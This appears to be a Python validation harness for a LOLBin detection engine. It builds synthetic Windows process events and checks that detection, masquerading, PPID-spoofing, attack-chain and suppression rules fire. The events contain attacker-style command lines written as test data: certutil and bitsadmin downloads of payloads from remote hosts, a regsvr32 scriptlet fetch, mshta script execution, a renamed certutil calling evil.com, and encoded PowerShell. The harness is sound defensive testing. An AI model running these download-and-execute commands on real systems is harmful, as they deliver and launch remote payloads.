"""Automated Threat Simulation & Detection Validation Harness for lolbins-detector.

Executes synthetic threat scenarios testing single-event rules, masquerading checks,
PPID spoofing anomalies, multi-event sequential attack chains, and suppression rules.
"""

from datetime import datetime, timezone
import sys
import time

from engine.detector import DetectionEngine
from engine.suppression import SuppressionEngine, SuppressionRule
from rules.loader import RuleLoader
from utils.models import ProcessEvent, Severity


class ThreatValidationHarness:
    """Automated testing harness validating behavioral detection coverage."""

    def __init__(self, rules_dir: str = "rules") -> None:
        """Initialize test harness and engine."""
        self.rules = RuleLoader.load_rules_from_directory(rules_dir)

        # Configure test suppression rules
        suppression_engine = SuppressionEngine(
            suppression_rules=[
                SuppressionRule(
                    rule_id="LOLBIN-003",
                    user="NT AUTHORITY\\SYSTEM",
                    reason="Legitimate Windows Update BITS whitelisting test",
                )
            ],
            cooldown_seconds=10.0,
            enable_deduplication=True,
        )

        self.engine = DetectionEngine(
            rules=self.rules,
            enable_heuristics=True,
            min_severity="low",
            window_seconds=600.0,
            suppression_engine=suppression_engine,
        )

    def run_all_tests(self) -> int:
        """Run all test suites and output structured validation table.

        Returns:
            0 if all tests pass, 1 otherwise.
        """
        print("\n" + "=" * 80)
        print("  LOLBins Detection System - Threat Simulation & Validation Harness")
        print("=" * 80 + "\n")

        tests = [
            ("LOLBIN-001", "Office App Spawning LOLBin (Word -> Certutil)", self._test_office_spawning),
            ("LOLBIN-002", "Suspicious Certutil Ingress Remote Download", self._test_certutil_download),
            ("LOLBIN-003", "Bitsadmin Remote File Transfer Job", self._test_bitsadmin_transfer),
            ("LOLBIN-004", "Mshta Inline JavaScript Protocol Execution", self._test_mshta_inline),
            ("LOLBIN-005", "Regsvr32 Squiblydoo COM Scriptlet Proxy", self._test_regsvr32_squiblydoo),
            ("MASQ-001",   "Binary Masquerading (CertUtil Renamed to updater.exe)", self._test_masquerading),
            ("PPID-001",   "Parent PID Spoofing Anomaly (Claims lsass.exe Parent)", self._test_ppid_spoofing),
            ("SEQ-001",    "Sequential Chain: Download Cradle -> Staged Execution", self._test_seq_download_execute),
            ("SEQ-002",    "Sequential Chain: LOLBin Activity -> Encoded PowerShell", self._test_seq_encoded_powershell),
            ("SEQ-003",    "Sequential Chain: Process Cascade (cmd -> pwsh -> mshta)", self._test_seq_cascading_shell),
            ("SUPPRESS",   "False Positive Suppression (Whitelisted BITS Job)", self._test_suppression),
        ]

        passed = 0
        failed = 0

        print(f"{'ID':<12} | {'Status':<8} | {'Latency':<8} | {'Description'}")
        print("-" * 80)

        for test_id, description, test_fn in tests:
            start_t = time.perf_counter()
            try:
                success, msg = test_fn()
                latency_ms = (time.perf_counter() - start_t) * 1000.0
                if success:
                    passed += 1
                    status_str = "\033[92mPASS\033[0m"
                else:
                    failed += 1
                    status_str = "\033[91mFAIL\033[0m"
                print(f"{test_id:<12} | {status_str:<17} | {latency_ms:>5.1f}ms | {description}")
                if not success and msg:
                    print(f"             └── \033[33mReason: {msg}\033[0m")
            except Exception as exc:
                failed += 1
                latency_ms = (time.perf_counter() - start_t) * 1000.0
                status_str = "\033[91mERROR\033[0m"
                print(f"{test_id:<12} | {status_str:<17} | {latency_ms:>5.1f}ms | {description} ({exc})")

        print("-" * 80)
        total = passed + failed
        print(f"\nTest Summary: {passed}/{total} Passed ({(passed/total)*100:.1f}%), {failed} Failed.\n")
        return 0 if failed == 0 else 1

    def _test_office_spawning(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=2040,
            ppid=1020,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -ping",
            user=r"WORKSTATION\Analyst",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "LOLBIN-001" for a in alerts)
        return has_match, "Expected rule LOLBIN-001 did not trigger"

    def _test_certutil_download(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=3010,
            ppid=2000,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin C:\temp\a.bin",
            user=r"WORKSTATION\Analyst",
            parent_image=r"C:\Windows\System32\cmd.exe",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "LOLBIN-002" for a in alerts)
        return has_match, "Expected rule LOLBIN-002 did not trigger"

    def _test_bitsadmin_transfer(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=3020,
            ppid=2000,
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line=r"bitsadmin.exe /transfer updateJob /download http://198.51.100.42/payload.exe C:\temp\a.exe",
            user=r"WORKSTATION\Analyst",
            parent_image=r"C:\Windows\System32\cmd.exe",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "LOLBIN-003" for a in alerts)
        return has_match, "Expected rule LOLBIN-003 did not trigger"

    def _test_mshta_inline(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=3030,
            ppid=2000,
            image=r"C:\Windows\System32\mshta.exe",
            command_line=r'mshta.exe javascript:a=new(ActiveXObject)("WScript.Shell");close()',
            user=r"WORKSTATION\Analyst",
            parent_image=r"C:\Windows\System32\cmd.exe",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "LOLBIN-004" for a in alerts)
        return has_match, "Expected rule LOLBIN-004 did not trigger"

    def _test_regsvr32_squiblydoo(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=3040,
            ppid=2000,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe /s /n /u /i:http://198.51.100.42/payload.sct scrobj.dll",
            user=r"WORKSTATION\Analyst",
            parent_image=r"C:\Windows\System32\cmd.exe",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "LOLBIN-005" for a in alerts)
        return has_match, "Expected rule LOLBIN-005 did not trigger"

    def _test_masquerading(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=4010,
            ppid=2000,
            image=r"C:\Users\Public\updater.exe",
            command_line=r"updater.exe -urlcache http://evil.com/test",
            user=r"WORKSTATION\Analyst",
            original_file_name="CertUtil.exe",
            hashes={"SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "MASQ-001" for a in alerts)
        return has_match, "Expected masquerading alert MASQ-001 did not trigger"

    def _test_ppid_spoofing(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=4020,
            ppid=680,
            image=r"C:\Windows\System32\cmd.exe",
            command_line=r"cmd.exe /c whoami",
            user=r"WORKSTATION\StandardUser",
            parent_image=r"C:\Windows\System32\lsass.exe",
            integrity_level="Medium",
        )
        alerts = self.engine.evaluate(ev)
        has_match = any(a.rule_id == "PPID-ANOMALY-001" for a in alerts)
        return has_match, "Expected PPID spoofing alert PPID-ANOMALY-001 did not trigger"

    def _test_seq_download_execute(self) -> tuple[bool, str]:
        ev1 = ProcessEvent(
            pid=5010,
            ppid=1000,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin C:\temp\staged.sct",
            user=r"WORKSTATION\TargetUser",
        )
        self.engine.evaluate(ev1)

        ev2 = ProcessEvent(
            pid=5020,
            ppid=1000,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe /s /n /u /i:C:\temp\staged.sct scrobj.dll",
            user=r"WORKSTATION\TargetUser",
        )
        alerts = self.engine.evaluate(ev2)
        has_match = any("SEQ-CHAIN-001" in a.rule_id for a in alerts)
        return has_match, "Expected sequential rule SEQ-CHAIN-001 did not trigger"

    def _test_seq_encoded_powershell(self) -> tuple[bool, str]:
        ev1 = ProcessEvent(
            pid=6010,
            ppid=1000,
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line=r"bitsadmin.exe /transfer updateJob http://198.51.100.42/a.bin C:\temp\a.bin",
            user=r"WORKSTATION\ChainUser",
        )
        self.engine.evaluate(ev1)

        ev2 = ProcessEvent(
            pid=6020,
            ppid=1000,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            user=r"WORKSTATION\ChainUser",
        )
        alerts = self.engine.evaluate(ev2)
        has_match = any("SEQ-CHAIN-002" in a.rule_id for a in alerts)
        return has_match, "Expected sequential rule SEQ-CHAIN-002 did not trigger"

    def _test_seq_cascading_shell(self) -> tuple[bool, str]:
        ev1 = ProcessEvent(
            pid=7001,
            ppid=1200,
            image=r"C:\Windows\System32\cmd.exe",
            command_line=r"cmd.exe /c start.bat",
            user=r"WORKSTATION\RootUser",
        )
        self.engine.evaluate(ev1)

        ev2 = ProcessEvent(
            pid=7002,
            ppid=7001,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"powershell.exe -ExecutionPolicy Bypass",
            user=r"WORKSTATION\RootUser",
            parent_image=r"C:\Windows\System32\cmd.exe",
        )
        self.engine.evaluate(ev2)

        ev3 = ProcessEvent(
            pid=7003,
            ppid=7002,
            image=r"C:\Windows\System32\mshta.exe",
            command_line=r"mshta.exe vbscript:Close",
            user=r"WORKSTATION\RootUser",
            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        alerts = self.engine.evaluate(ev3)
        has_match = any("SEQ-CHAIN-003" in a.rule_id for a in alerts)
        return has_match, "Expected process cascade rule SEQ-CHAIN-003 did not trigger"

    def _test_suppression(self) -> tuple[bool, str]:
        ev = ProcessEvent(
            pid=8010,
            ppid=500,
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line=r"bitsadmin.exe /transfer updateJob http://198.51.100.42/test.bin C:\temp\test.bin",
            user=r"NT AUTHORITY\SYSTEM",
        )
        alerts = self.engine.evaluate(ev)
        is_suppressed = not any(a.rule_id == "LOLBIN-003" for a in alerts)
        return is_suppressed, "Alert for whitelisted user NT AUTHORITY\\SYSTEM was not suppressed"


if __name__ == "__main__":
    harness = ThreatValidationHarness()
    sys.exit(harness.run_all_tests())
